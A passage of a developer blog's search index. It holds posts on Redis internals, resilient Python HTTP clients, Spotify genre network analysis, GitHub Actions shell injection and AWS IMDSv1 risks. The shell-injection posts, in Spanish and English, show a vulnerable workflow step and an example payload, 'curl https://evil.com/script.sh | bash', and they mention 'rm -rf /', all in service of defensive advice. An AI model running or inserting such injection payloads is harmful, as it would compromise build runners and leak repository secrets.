https://protobuf.dev/programming-guides/encoding/</li> <li>FastAPI Advanced Responses: https://fastapi.tiangolo.com/advanced/custom-response/</li> <li>gRPC Overview: https://grpc.io/docs/</li> </ul>"},{"location":"blog/blogs/2026-02-13_redis-internals-and-data-structures/","title":"Redis Internals &amp; Data Structures","text":"<p>Redis is often called a \u201cSwiss Army Knife\u201d for developers. It\u2019s not just a cache; it\u2019s an in-memory data structure server that trades disk durability for extreme speed and predictable performance.</p> <p>Understanding how Redis manages its \u201cbackbone\u201d\u2014the event loop and its specialized C-based structures\u2014is the difference between a system that scales and one that suffers from \u201chot-key\u201d bottlenecks.</p> <p>This guide covers:</p> <ul> <li>The Single-Threaded Event Loop (I/O Multiplexing)</li> <li>Core Data Structures (Strings, Hashes, Lists, Sets, ZSets)</li> <li>Internal Encodings (SDS, ZipList, SkipList)</li> <li>Memory Management &amp; Eviction</li> <li>Persistence (RDB vs. AOF)</li> <li>Redis Cluster &amp; Sharding</li> </ul>"},{"location":"blog/blogs/2026-02-13_redis-internals-and-data-structures/#1-the-architecture-why-its-so-fast","title":"1. The Architecture: Why it\u2019s so fast","text":"<p>At its core, Redis is Single-Threaded for command execution. This sounds like a bottleneck, but it\u2019s its greatest strength. By avoiding context switching and expensive locks (mutexes), Redis can process 100k+ requests per second on a single core.</p>"},{"location":"blog/blogs/2026-02-13_redis-internals-and-data-structures/#the-event-loop-io-multiplexing","title":"The Event Loop (I/O Multiplexing)","text":"<p>Redis uses <code>epoll</code> (Linux) or <code>kqueue</code> (BSD/macOS) to monitor thousands of concurrent connections. It waits for data to be \u201cready\u201d on a socket, processes the command, and moves to the next.</p>"},{"location":"blog/blogs/2026-02-13_redis-internals-and-data-structures/#2-the-data-structure-backbone","title":"2. The Data Structure \u201cBackbone\u201d","text":"<p>Redis doesn\u2019t store data as \u201cblind blobs.\u201d It understands the type of data it holds, allowing for atomic operations like \u201cincrement this counter\u201d or \u201cpop from this list.\u201d</p>"},{"location":"blog/blogs/2026-02-13_redis-internals-and-data-structures/#a-strings-sds","title":"A. Strings (SDS)","text":"<p>The most basic type. Internally, Redis uses Simple Dynamic Strings (SDS) instead of standard C strings.</p> <ul> <li>O(1) Length: C strings require scanning for <code>\\0</code>; SDS stores length.</li> <li>Binary Safe: Can store images or serialized Protobuf objects.</li> </ul>"},{"location":"blog/blogs/2026-02-13_redis-internals-and-data-structures/#b-lists-quicklists","title":"B. Lists (Quicklists)","text":"<p>Implemented as a Quicklist (a hybrid of Linked Lists and ZipLists).</p> <ul> <li>LPOP/RPUSH: O(1) performance.</li> <li>Use Case: Task queues (like Celery\u2019s Redis broker).</li> </ul>"},{"location":"blog/blogs/2026-02-13_redis-internals-and-data-structures/#c-hashes-dicts","title":"C. Hashes (Dicts)","text":"<p>Perfect for representing objects (e.g., a User profile).</p> <ul> <li>Efficiency: Small hashes are compressed into ZipLists to save RAM.</li> <li>O(1) Access: Direct access to fields without fetching the whole object.</li> </ul>"},{"location":"blog/blogs/2026-02-13_redis-internals-and-data-structures/#d-sorted-sets-skiplists","title":"D. Sorted Sets (SkipLists)","text":"<p>The \u201cMagic\u201d of Redis. Every element has a Score.</p> <ul> <li>SkipList Internals: A probabilistic structure that allows O(log N) search/insert, similar to a balanced tree but easier to implement for range queries.</li> <li>Use Case: Leaderboards and Rate Limiters.</li> </ul>"},{"location":"blog/blogs/2026-02-13_redis-internals-and-data-structures/#3-internal-encodings-optimization","title":"3. Internal Encodings &amp; Optimization","text":"<p>Redis is obsessed with memory. It will change the internal representation of your data based on its size.</p> Data Type Small Dataset Encoding Large Dataset Encoding String Integer (if numeric) SDS (Simple Dynamic String) Hash ZipList (Memory efficient) Hash Table (O(1) lookup) List Quicklist Quicklist Set IntSet (if only integers) Hash Table ZSet ZipList SkipList + Hash Table"},{"location":"blog/blogs/2026-02-13_redis-internals-and-data-structures/#4-persistence-rdb-vs-aof","title":"4. Persistence: RDB vs. AOF","text":"<p>Because Redis is in-memory, a crash = data loss. To fix this, it offers two backbones for durability:</p> <ol> <li> <p>RDB (Snapshotting): A compact, point-in-time binary snapshot. * Pros: Extremely fast restarts. * Cons: You might lose data between snapshots (e.g., last 5 mins).</p> </li> <li> <p>AOF (Append Only File): Logs every write operation. * Pros: Durable (fsync every second). * Cons: Larger file size; slower recovery.</p> </li> </ol> <p>The Modern Pro-Tip: Most production setups use Hybrid Persistence (AOF + RDB preamble).</p>"},{"location":"blog/blogs/2026-02-13_redis-internals-and-data-structures/#5-scaling-redis-cluster-sharding","title":"5. Scaling: Redis Cluster &amp; Sharding","text":"<p>When one server isn\u2019t enough, Redis scales horizontally via Clustering.</p> <ul> <li>Hash Slots: The keyspace is divided into 16,384 slots.</li> <li>CRC16(key) % 16384: This formula determines which node owns your data.</li> <li>Gossip Protocol: Nodes talk to each other to detect failures and handle failovers automatically via Redis Sentinel.</li> </ul>"},{"location":"blog/blogs/2026-02-13_redis-internals-and-data-structures/#6-real-world-logic-pythonfastapi","title":"6. Real-World Logic (Python/FastAPI)","text":"<pre><code>import redis\n\n# Connecting to the backbone\nr = redis.Redis(host='localhost', port=6379, db=0)\n\n# Atomic Counter (Thread-safe by design)\nr.incr('page_views')\n\n# Using a Hash for a User Profile\nr.hset('user:100', mapping={\n    'username': 'kfir_dev',\n    'tier': 'premium',\n    'status': 'active'\n})\n\n# Range query on a Sorted Set (Leaderboard)\ntop_users = r.zrevrange('leaderboard', 0, 9, withscores=True)\n</code></pre>"},{"location":"blog/blogs/2026-02-13_redis-internals-and-data-structures/#summary-checklist","title":"Summary Checklist","text":"<ul> <li>[x] Strings for basic keys and counters.</li> <li>[x] Hashes for structured objects.</li> <li>[x] Lists for FIFO/LIFO queues.</li> <li>[x] Sorted Sets for ranking and time-series logic.</li> <li>[x] TTLs (Time To Live) to prevent memory exhaustion.</li> </ul>"},{"location":"blog/blogs/2026-02-13_redis-internals-and-data-structures/#references","title":"References","text":"<ul> <li>Redis Official Data Structures: https://redis.io/technology/data-structures/</li> <li>Redis Internals (Deep Dive): https://redis.io/docs/latest/develop/data-types/</li> </ul>"},{"location":"blog/blogs/2026-02-25_robust-http-python-guide/","title":"2026 02 25 robust http python guide","text":"<p>title: The Robust HTTP Client - Beyond simple requests.get() published: true  date: 2026-02-25 00:00:00 UTC  tags: python,http,networking,performance,backend,architecture  canonical_url: https://kfir-g.dev/blog/blogs/2026-02-25_robust-http-python-guide</p>"},{"location":"blog/blogs/2026-02-25_robust-http-python-guide/#the-robust-http-client-guide","title":"The Robust HTTP Client Guide","text":"<p>In a perfect world, APIs never fail. In the real world, the API call is a crucial component of your architecture. It is the bridge between your service and the outside world. If that bridge is fragile, your entire system is at risk of cascading failures.</p> <p>To build production-grade backends, we must move beyond simple scripts and treat HTTP calls as first-class citizens that require resilience, resource management, and strict protocol adherence.</p>"},{"location":"blog/blogs/2026-02-25_robust-http-python-guide/#1-the-library-battle-requests-vs-aiohttp-vs-httpx","title":"1. The Library Battle: Requests vs. AIOHTTP vs. HTTPX","text":"<p>Before writing a single line of logic, you have to choose your transport engine.</p> Library Paradigm Protocol The Verdict Requests Synchronous HTTP/1.1 Simple, but blocks threads. No HTTP/2. Docs AIOHTTP Asynchronous HTTP/1.1 High performance for async loops. No sync API. Docs HTTPX Sync + Async HTTP/2 The modern standard. Supports multiplexing. Docs"},{"location":"blog/blogs/2026-02-25_robust-http-python-guide/#2-understanding-the-protocols-rfc-91109113","title":"2. Understanding the Protocols (RFC 9110/9113)","text":"<ul> <li>HTTP/1.1 (RFC 9112): Reliable but suffers from Head-of-Line (HOL) blocking. One request must finish before the next starts on the same connection.</li> <li>HTTP/2 (RFC 9113): Uses Multiplexing to send multiple requests/responses over a single TCP connection simultaneously.</li> <li>HTTP/3 (RFC 9114): Built on QUIC (UDP). Solves HOL blocking at the packet level.</li> </ul>"},{"location":"blog/blogs/2026-02-25_robust-http-python-guide/#3-resilience-retries-backoff-and-jitter","title":"3. Resilience: Retries, Backoff, and Jitter","text":"<p>If an API call fails, your recovery strategy determines your system\u2019s survival.</p> <ol> <li>Exponential Backoff (RFC 7231): Increase the wait time between retries ($2^{attempt}$) to give the downstream service room to breathe.</li> <li>Jitter: Add randomness to your backoff. This prevents the \u201cThundering Herd\u201d effect, where all your workers retry at the exact same microsecond, effectively DDoS-ing your own internal service.</li> </ol>"},{"location":"blog/blogs/2026-02-25_robust-http-python-guide/#4-memory-discipline-streaming-vs-buffering","title":"4. Memory Discipline: Streaming vs. Buffering","text":"<p>Never use <code>response.json()</code> or <code>response.content</code> for large payloads. This loads the entire object into RAM. Instead, use Chunked Transfer Encoding (RFC 7230) to process data as it arrives.</p>"},{"location":"blog/blogs/2026-02-25_robust-http-python-guide/#5-header-discipline-tracing","title":"5. Header Discipline &amp; Tracing","text":"<ul> <li>X-Request-ID: Crucial for distributed tracing. Link your logs to the downstream logs.</li> <li>Accept-Encoding: Use <code>br</code> (Brotli) or <code>gzip</code> to reduce payload size.</li> <li>Idempotency-Key (RFC 9110 Section 9.2.2): Required for safe <code>POST</code> retries.</li> </ul>"},{"location":"blog/blogs/2026-02-25_robust-http-python-guide/#the-implementation-a-production-ready-client","title":"The Implementation: A Production-Ready Client","text":"<p>Here is the full code for a robust, asynchronous client using HTTPX and Tenacity.</p> <pre><code>import httpx\nimport logging\nimport uuid\nfrom tenacity import (\n    retry, \n    stop_after_attempt, \n    wait_exponential_jitter, \n    retry_if_exception_type\n)\n\n# Configuration\nlogging.basicConfig(level=logging.INFO)\nlogger = logging.getLogger(\"RobustClient\")\n\nclass RobustHTTPClient:\n    def __init__(self):\n        # 1. Connection Pool &amp; HTTP/2 Support\n        self.client = httpx.AsyncClient(\n            http2=True,\n            timeout=httpx.Timeout(10.0, connect=5.0),\n            limits=httpx.Limits(max_keepalive_connections=5, max_connections=20)\n        )\n\n    # 2. Resilience: Retry only on network noise or server 5xx\n    @retry(\n        retry=retry_if_exception_type((httpx.ConnectError, httpx.TimeoutException)),\n        stop=stop_after_attempt(3),\n        wait=wait_exponential_jitter(initial=1, max=10),\n        reraise=True\n    )\n    async def get_json(self, url: str):\n        request_id = str(uuid.uuid4())\n        headers = {\n            \"X-Request-ID\": request_id,\n            \"User-Agent\": \"CodeWithMate/1.0\",\n            \"Accept-Encoding\": \"gzip, br\"\n        }\n\n        logger.info(f\"Sending Request: {url} | ID: {request_id}\")\n\n        response = await self.client.get(url, headers=headers)\n\n        # 3. Validation: RFC 9110 Status Check\n        response.raise_for_status()\n        return response.json()\n\n    # 4. Memory Efficiency: Chunked streaming\n    async def download_large_file(self, url: str, destination: str):\n        async with self.client.stream(\"GET\", url) as response:\n            with open(destination, \"wb\") as f:\n                async for chunk in response.aiter_bytes(chunk_size=8192):\n                    f.write(chunk)\n\n    async def close(self):\n        await self.client.aclose()\n\n# Example Usage with FastAPI/Lifespan\n# async with RobustHTTPClient() as client:\n#     data = await client.get_json(\"https://api.example.com/data\")\n</code></pre>"},{"location":"blog/blogs/2026-02-25_robust-http-python-guide/#helpful-tools","title":"Helpful Tools","text":"<ul> <li>Tenacity: Declarative retry logic.</li> <li>RESPX: Mocking HTTPX for unit tests.</li> <li>HTTPie: Modern CLI for manual API testing.</li> </ul>"},{"location":"blog/old-blogs/2021-12-18_Spotify---Genres-Network-Analysis-3047c5b9b777/","title":"Spotify \u2014 Genres Network Analysis","text":"<p>Spotify is the largest music streaming service in the world serving more than 381 million users in over 180+ countries around the world\u2026 </p>"},{"location":"blog/old-blogs/2021-12-18_Spotify---Genres-Network-Analysis-3047c5b9b777/#spotify-genres-network-analysis_1","title":"Spotify \u2014 Genres Network Analysis","text":"<p>Spotify is the largest music streaming service in the world serving more than 381 million users in over 180+ countries around the world. with millions of active users, and a huge variety of music genres, Spotify creates a great database that I was interested to explore.</p> <p>I was curious to see if by creating a genres network I could find a correlation between the number of artists playing a genre to its betweenness centrality in the network. To do so, I gathered the data using Spotify API and \u201cSpotipy\u201d Python library. I used the ORA network software to analyze and visualize the data.</p> <p>Collecting Data</p> <p>The Spotify genres couldn\u2019t all be pulled at once. Therefore, I collected all 1256 playlists from the Spotify official account. The reason I chose to use the official Spotify account playlists is the lack of influence by a particular genre, a particular era, or a certain country.</p> <p>For every song in the playlists, I took its artist, then for every artist I used the \u2018related-artist\u2019 function on Spotify API which gave me 20 more related artists to each one of the artists on my list. This step allowed me to expand my dataset. The next step was to determine how many artists shared the same genre duo. Through the Spotify API, I gathered information on each artist\u2019s related genres. These 1937 genres were inputted into a matrix.</p> <p>Network Analysis</p> <p>Using the matrix I built, I created the genres network. My approach was to create a genre-based network in which every node consists of one musical genre. The edge weight is the number of artists who play both genres.</p> <p>Left- Genres Network Graph, Bode Color by Louvain Algorithm. Right- Zoom In</p> <p>I discovered that the number of artists related to a genre is distributed in a power-law distribution. This means that a few genres are played by a lot of artists, while many other genres are played by a fewer number of artists.</p> <p>Among all genres, Rock, Dance-Pop, and Classic-Rock have the largest number of musicians who played those genres.</p> <p></p> <p>Dance-Pop, Pop, and Pop-Rap for example, had the larger betweenness rate (Normalized betweenness measures how often one node acts as a bridge between two other nodes).</p> <p></p> <p>Conclusion</p> <p>In the linear line function, the X axis represents the degree betweenness of a genre. The Y axis represents the total degree of a genre.</p> <p></p> <p>The coefficient of determination is 0.4, which indicates a low positive correlation. It shows that when more artists play a genre, that genre will have more connections with other genres in the network.</p> <p>Final Notes</p> <p>This was my first attempt to understand and analyze a data network. As an active Spotify user, I enjoyed learning about Spotify\u2019s genre network Since the platform gives a lot of data from many perspectives. I feel that I have only touched the tip of the iceberg.</p> <p>Contact me : Gmail GitHub LinkedIn</p> <p>By Kfir Gisman on December 18, 2021.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2022-03-20_Spotify--Genres-Network-Analysis-by-Through-Decades-b7d325f9677a/","title":"Spotify- Genres Network Analysis by Through Decades","text":"<p>In my last story, \u201cSpotify \u2014 Genres Network Analysis\u201d, I felt I had only begun to explore Spotify genres network. As a fan of certain\u2026 </p>"},{"location":"blog/old-blogs/2022-03-20_Spotify--Genres-Network-Analysis-by-Through-Decades-b7d325f9677a/#spotify-genres-network-analysis-by-through-decades_1","title":"Spotify- Genres Network Analysis by Through Decades","text":"<p>In my last story, \u201c Spotify \u2014 Genres Network Analysis\u201d, I felt I had only begun to explore Spotify genres network. As a fan of certain music genres, I wondered what their role was throughout the decades in terms of popularity. I was especially curious about the popularity and the importance of pop and rock in the years of 1960\u20132020.</p>"},{"location":"blog/old-blogs/2022-03-20_Spotify--Genres-Network-Analysis-by-Through-Decades-b7d325f9677a/#the-data","title":"The Data","text":"<p>To answer my question, I needed to collect all the genres in Spotify. It was not possible to pull all Spotify genres simultaneously. I instead collected all 1256 Spotify official __ playlists with Spotify API. Every song on the playlist I labelled according to the decade it belongs to by the song\u2019s field \u201crelease_date\u201d. This gave me a table of songs for each decade. Further, I pulled out the genre for every track and finally I made a table of genres for each decade. (link to the python file)</p> <p>I modelled each decade table as a social network, with each node representing a musical genre. The edge weight represents the number of artists that played both genres.</p> <p>The networks that came out were: 60\u2019s: 297 nodes with 4248 links. 70\u2019s: 422 nodes with 6330 links. 80\u2019s: 609 nodes with 8378 links. 90\u2019s: 1114 nodes with 15900 links. 2000s: 1726 nodes with 25902 links. 2010s: 1909 nodes with 38912 links. 2020s: 1897 nodes with 31840 links.</p> <p>An example of the 60\u2019s Network</p> <p>Finally, I combined all the decades\u2019 networks into one dynamic social network __ that allowed me to see the genres through a timeline.</p>"},{"location":"blog/old-blogs/2022-03-20_Spotify--Genres-Network-Analysis-by-Through-Decades-b7d325f9677a/#findings","title":"Findings","text":"<p>For an analysis of the relative importance of a genre over decades, I used the measure of betweenness __ that gave me a relative score of the genre. Based on this score, I could tell whether the genre was largely important and popular.</p> <p>The Betweenness Graph of The Pop and Rock Genres</p> <p>According to this graph, the Rock reached its peak in the 1980s and then began to decline. Meanwhile, Pop has grown rapidly starting to gain its popularity around 1980s.</p>"},{"location":"blog/old-blogs/2022-03-20_Spotify--Genres-Network-Analysis-by-Through-Decades-b7d325f9677a/#conclusions","title":"Conclusions","text":"<p>In the 1980\u2019s, the peak of the betweenness graph correlates with the high rate of rock songs released in the following graph. On both graphs, the peaks appear in the late 1970\u2019s and at the beginning of the 1980\u2019s.</p> <p>Graph by \u201c FiveThirtyEight\u201d</p> <p>Based on the data presented in \u201cThe date face\u201d (shown below), the pop genre became popular in the 1980\u2019s and soared to popularity in the start of the 2000\u2019s. This information correlates with the betweenness graph, which demonstrate that pop became extremely popular and focal in the beginning of the 2000\u2019s.</p> <p></p> <p>Thanks to Omer and Mahdi for helped me gather the data.</p> <p>Contact Me: Github</p> <p>By Kfir Gisman on March 20, 2022.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2023-07-04_Inyecci-n-de-Shell-en-CI-CD-de-GitHub-Actions-83f03a7252ce/","title":"Inyecci\u00f3n de Shell en CI/CD de GitHub Actions","text":"<p>GitHub Actions ofrece un tipo de evento especial llamado pull_request_target que permite que los flujos de trabajo se ejecuten en\u2026 </p> <p>Inyecci\u00f3n de Shell en CI/CD de GitHub Actions</p> <p>Photo by FLY:D on Unsplash</p> <p>GitHub Actions ofrece un tipo de evento especial llamado <code>pull_request_target</code> que permite que los flujos de trabajo se ejecuten en solicitudes de extracci\u00f3n desde bifurcaciones con los mismos permisos que el repositorio base. Esto puede ser \u00fatil en algunos escenarios, como comentar en solicitudes de extracci\u00f3n o verificar dependencias privadas. Sin embargo, tambi\u00e9n conlleva riesgos significativos de seguridad y se debe utilizar con precauci\u00f3n.</p> <p>Uno de los principales riesgos de usar <code>pull_request_target</code> es que expone secretos y variables de entorno a c\u00f3digo no confiable de la solicitud de extracci\u00f3n. Esto significa que un atacante puede crear una solicitud de extracci\u00f3n maliciosa que roba o divulga esta informaci\u00f3n sensible, o las utiliza para realizar acciones no autorizadas en nombre del propietario del repositorio. Por ejemplo, un atacante podr\u00eda acceder al token de GitHub y crear nuevos problemas, comentarios, versiones o incluso eliminar el repositorio.</p> <p>Otro riesgo de usar <code>pull_request_target</code> es que ejecuta el archivo de flujo de trabajo desde la rama base, no desde la rama de la solicitud de extracci\u00f3n. Esto significa que un atacante puede modificar el archivo de flujo de trabajo en la solicitud de extracci\u00f3n e inyectar comandos o scripts arbitrarios que se ejecutar\u00e1n en el flujo de trabajo de la rama base. Por ejemplo, un atacante podr\u00eda agregar un paso que ejecuta <code>rm -rf /</code> en la m\u00e1quina del ejecutor, o ejecutar un shell remoto.</p> <p>Una de las formas en que un atacante puede inyectar comandos o scripts en el flujo de trabajo es utilizando una inyecci\u00f3n de shell. La inyecci\u00f3n de shell es una t\u00e9cnica que aprovecha una vulnerabilidad en un programa que ejecuta un comando en un shell sin escapar o validar correctamente la entrada. Por ejemplo, si el flujo de trabajo utiliza un paso como este:</p> <pre><code>- name: Ejecutar comando  \n  run: echo ${{ github.event.pull_request.body }}\n</code></pre> <p>Un atacante podr\u00eda crear una solicitud de extracci\u00f3n con un cuerpo como este:</p> <pre><code>Hola mundo; curl https://evil.com/script.sh | bash\n</code></pre> <p>Esto har\u00eda que el flujo de trabajo ejecute el comando <code>echo Hola mundo; curl https://evil.com/script.sh | bash</code>, que descargar\u00eda y ejecutar\u00eda un script malicioso desde una fuente externa.</p> <p>Para prevenir ataques de inyecci\u00f3n de shell, los usuarios de GitHub Actions deben seguir algunas mejores pr\u00e1cticas, como:</p> <ul> <li>Escapar o citar la entrada de la solicitud de extracci\u00f3n antes de utilizarla en el flujo de trabajo.</li> <li>Utilizar funciones o acciones integradas para manejar la entrada en lugar de ejecutar comandos en un shell.</li> <li>Utilizar herramientas de an\u00e1lisis de c\u00f3digo para detectar vulnerabilidades en el c\u00f3digo o el flujo de trabajo.</li> <li>Utilizar herramientas o servicios de terceros para ejecutar flujos de trabajo en entornos aislados.</li> </ul> <p>Referencias:  https://securitylab.github.com/research/github-actions-preventing-pwn-requests/ https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/</p> <p>By Kfir Gisman on July 4, 2023.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2023-07-09_Shell-injection-in-GitHub-Actions-CI-CD-dc137317bc9/","title":"Shell injection in GitHub Actions CI/CD","text":"<p>Translated from my blog in Spanish: https://medium.com/@kfir_g/inyecci%C3%B3n-de-shell-en-ci-cd-de-github-actions-83f03a7252ce </p>"},{"location":"blog/old-blogs/2023-07-09_Shell-injection-in-GitHub-Actions-CI-CD-dc137317bc9/#shell-injection-in-github-actions-cicd_1","title":"Shell injection in GitHub Actions CI/CD","text":"<p>Translated from my blog in Spanish: https://medium.com/@kfir_g/inyecci%C3%B3n-de-shell-en-ci-cd-de-github-actions-83f03a7252ce</p> <p>GitHub Actions offers a special event type called <code>pull_request_target</code>that allows workflows to run on pull requests from forks with the same permissions as the base repository. This can be useful for some scenarios, such as commenting on pull requests or checking out private dependencies. However, it also comes with significant security risks, and should be used with caution.</p> <p>One of the main risks of using <code>pull_request_target</code>is that it exposes secrets and environment variables to untrusted code from the pull request. This means that an attacker can create a malicious pull request that steals or leaks these sensitive information, or uses them to perform unauthorized actions on behalf of the repository owner. For example, an attacker could access the GitHub token and create new issues, comments, releases, or even delete the repository.</p> <p>Another risk of using <code>pull_request_target</code>is that it runs the workflow file from the base branch, not from the pull request branch. This means that an attacker can modify the workflow file in the pull request and inject arbitrary commands or scripts that will run on the base branch\u2019s workflow. For example, an attacker could add a step that runs <code>rm -rf /</code>on the runner machine, or executes a remote shell.</p> <p>One of the ways that an attacker can inject commands or scripts into the workflow is by using shell injection. Shell injection is a technique that exploits a vulnerability in a program that executes a command in a shell without properly escaping or validating the input. For example, if the workflow uses a step like this:</p> <pre><code>- name: inject command  \n  run: echo ${{ github.event.pull_request.body }}\n</code></pre> <p>An attacker could create a pull request with a body like this:</p> <pre><code>Hello world; curl https://evil.com/script.sh | bash\n</code></pre> <p>This would cause the workflow to run the command <code>echo Hello World; curl https://evil.com/script.sh | bash</code>, which would download and execute a malicious script from an external source.</p> <p>To prevent shell injection attacks, GitHub Actions users should follow some best practices, such as: \u2014 Escaping or quoting the input from the pull request before using it in the workflow.  \u2014 Using built-in functions or actions to handle the input instead of running commands in a shell.  \u2014 Using code scanning tools to detect vulnerabilities in the code or the workflow.  \u2014 Using third-party tools or services to run workflows in isolated environments.</p> <p>References:  https://securitylab.github.com/research/github-actions-preventing-pwn-requests/ https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/</p> <p>By Kfir Gisman on July 9, 2023.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2023-07-20_Por-qu--IMDSv1-es-un-riesgo-de-seguridad-para-la-infraestructura-en-nube-891c3668efc5/","title":"Por qu\u00e9 IMDSv1 es un riesgo de seguridad para la infraestructura en nube","text":"<p>El Servicio de Metadatos de Instancia (IMDS) de Amazon proporciona una forma para que las aplicaciones que se ejecutan en instancias de\u2026 </p>"},{"location":"blog/old-blogs/2023-07-20_Por-qu--IMDSv1-es-un-riesgo-de-seguridad-para-la-infraestructura-en-nube-891c3668efc5/#por-que-imdsv1-es-un-riesgo-de-seguridad-para-la-infraestructura-en-nube_1","title":"Por qu\u00e9 IMDSv1 es un riesgo de seguridad para la infraestructura en nube","text":"<p>El Servicio de Metadatos de Instancia (IMDS) de Amazon proporciona una forma para que las aplicaciones que se ejecutan en instancias de Amazon Elastic Compute Cloud (EC2) accedan a los metadatos y datos de usuario de la instancia. Sin embargo, se ha demostrado que la primera versi\u00f3n de este servicio, IMDSv1, es vulnerable a ataques de falsificaci\u00f3n de solicitudes en el lado del servidor (SSRF). En esta publicaci\u00f3n del blog, explicaremos los riesgos de seguridad asociados con el uso de IMDSv1 y por qu\u00e9 es importante actualizar a IMDSv2, que es m\u00e1s seguro.</p>"},{"location":"blog/old-blogs/2023-07-20_Por-qu--IMDSv1-es-un-riesgo-de-seguridad-para-la-infraestructura-en-nube-891c3668efc5/#cual-es-la-diferencia-entre-el-protocolo","title":"\u00bfCu\u00e1l es la diferencia entre el protocolo?","text":"<p>IMDSv1 e IMDSv2 son dos versiones del Servicio de Metadatos de Instancia (IMDS) proporcionado por AWS. IMDS es un servicio que permite a las instancias EC2 acceder a metadatos y credenciales desde un punto final local.</p> <p>La principal diferencia entre IMDSv1 e IMDSv2 es que IMDSv2 utiliza <code>session autherntication</code>proteger contra cortafuegos abiertos (open firewall), proxies inversos y vulnerabilidades SSRF. IMDSv2 requiere que el software que se ejecuta en la instancia EC2 obtenga un <code>secret token</code> mediante una solicitud PUT antes de realizar cualquier solicitud GET al IMDS. El token caduca despu\u00e9s de un m\u00e1ximo de seis horas y se puede utilizar para solicitudes posteriores dentro de la misma sesi\u00f3n.</p> <p>Por otro lado, IMDSv1 utiliza solicitudes GET no autenticadas y es m\u00e1s susceptible a ataques SSRF. IMDSv1 no requiere tokens ni gesti\u00f3n de sesiones.</p> <p>AWS recomienda adoptar IMDSv2 y restringir el acceso solo a IMDSv2 para mayor seguridad. Puede usar AWS Systems Manager para hacer cumplir IMDSv2 en sus instancias EC2. Tambi\u00e9n puede usar las \u00faltimas versiones de los SDK y CLI de AWS que admiten IMDSv2.</p>"},{"location":"blog/old-blogs/2023-07-20_Por-qu--IMDSv1-es-un-riesgo-de-seguridad-para-la-infraestructura-en-nube-891c3668efc5/#como-aplicar-imdsv2-en-el-archivo-yaml-de-terraform","title":"C\u00f3mo aplicar IMDSv2 en el archivo yaml de Terraform","text":"<p>Puede aplicar el uso de IMDSv2 en una instancia EC2 lanzada por Terraform configurando el bloque <code>metadata_options</code>dentro del recurso <code>aws_instance</code>. Dentro de este bloque, puede establecer el atributo <code>http_tokens</code> en <code>required</code>, lo que har\u00e1 cumplir el uso de IMDSv2 en la instancia.</p> <p>Aqu\u00ed hay un ejemplo:</p> <pre><code>resource \"aws_instance\" \"example\" {  \n  ami           = \"ami-0c94855ba95c71c99\" #Este es un ejemplo ID AMI Amazon Linux 2; reemplace con el ID AMI deseado para su regi\u00f3n\n\n  metadata_options {  \n    http_tokens = \"required\"  \n  }  \n}\n</code></pre> <p>Esta configuraci\u00f3n lanzar\u00e1 una instancia EC2 que requiere el uso de IMDSv2 para acceder a sus metadatos.</p>"},{"location":"blog/old-blogs/2023-07-20_Por-qu--IMDSv1-es-un-riesgo-de-seguridad-para-la-infraestructura-en-nube-891c3668efc5/#como-aplicar-imdsv2-con-aws-cli","title":"C\u00f3mo aplicar IMDSv2 con AWS CLI","text":"<p>Puede usar el comando modify-instance-metadata-options del AWS CLI para hacer cumplir el uso de IMDSv2 en una instancia EC2 existente. Este comando le permite modificar los par\u00e1metros de metadatos de instancia en una instancia en ejecuci\u00f3n o detenida.</p> <pre><code>aws ec2 modify-instance-metadata-options --instance-id i-0123456789abcdef --http-tokens required --http-endpoint enabled\n</code></pre> <p>En este ejemplo, reemplace <code>i0123456789abcdef</code>con el ID de la instancia que desea modificar. La opci\u00f3n<code>--http-tokens required</code> hace cumplir el uso de IMDSv2 en la instancia, mientras que la opci\u00f3n<code>--http-endpoint enabled</code>asegura que el servicio de metadatos de instancia permanezca habilitado.</p>"},{"location":"blog/old-blogs/2023-07-20_Por-qu--IMDSv1-es-un-riesgo-de-seguridad-para-la-infraestructura-en-nube-891c3668efc5/#que-cosas-notables-sucedieron-en-el-pasado","title":"\u00bfQu\u00e9 cosas notables sucedieron en el pasado?","text":"<p>En junio de 2021, un actor amenazante conocido como UNC2903 explot\u00f3 una vulnerabilidad en la herramienta de administraci\u00f3n de bases de datos Adminer para cosechar y abusar credenciales utilizando el Servicio de Metadatos de Instancia (IMDS) de Amazon. El atacante utiliz\u00f3 una caja rel\u00e9 con un script redireccionador 301 para enga\u00f1ar al servidor v\u00edctima y hacer que siguiera la redirecci\u00f3n y devolviera un error que conten\u00eda credenciales de API de AWS. Luego, el atacante utiliz\u00f3 estas credenciales para acceder a la cuenta de AWS de la v\u00edctima. Este ataque destaca la importancia de actualizar a IMDSv2, que habr\u00eda mitigado este ataque.</p>"},{"location":"blog/old-blogs/2023-07-20_Por-qu--IMDSv1-es-un-riesgo-de-seguridad-para-la-infraestructura-en-nube-891c3668efc5/#conclusion","title":"Conclusi\u00f3n","text":"<p>En conclusi\u00f3n, IMDSv1 es un riesgo de seguridad para la infraestructura en la nube debido a su vulnerabilidad a los ataques de falsificaci\u00f3n de solicitudes en el lado del servidor (SSRF). Por otro lado, IMDSv2 utiliza autenticaci\u00f3n de sesi\u00f3n y requiere que se obtenga un token secreto antes de realizar cualquier solicitud al IMDS, lo que proporciona una mayor seguridad contra los ataques SSRF. Es importante actualizar a IMDSv2 y aplicar su uso en las instancias EC2, ya sea a trav\u00e9s de la configuraci\u00f3n de Terraform o mediante el uso del AWS CLI. Incidentes notables, como el llevado a cabo por UNC2903, destacan la importancia de actualizar a IMDSv2 para mitigar el riesgo de cosecha y abuso de credenciales.</p>"},{"location":"blog/old-blogs/2023-07-20_Por-qu--IMDSv1-es-un-riesgo-de-seguridad-para-la-infraestructura-en-nube-891c3668efc5/#referencias","title":"Referencias:","text":"<p>Use IMDSv2 \u2014 Amazon Elastic Compute Cloud. https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html</p> <p>How can I use Systems Manager automation to enforce that only IMDSv2 is used to access instance metadata from my Amazon EC2 instance? https://repost.aws/knowledge-center/ssm-ec2-enforce-imdsv2</p> <p>Add defense in depth against open firewalls, reverse proxies, and SSRF vulnerabilities with enhancements to the EC2 Instance Metadata Service https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/</p> <p>Leerlo en ingles:**** Why IMDSv1 is a Security Risk for Cloud Infrastructure</p> <p>By Kfir Gisman on July 20, 2023.</p> 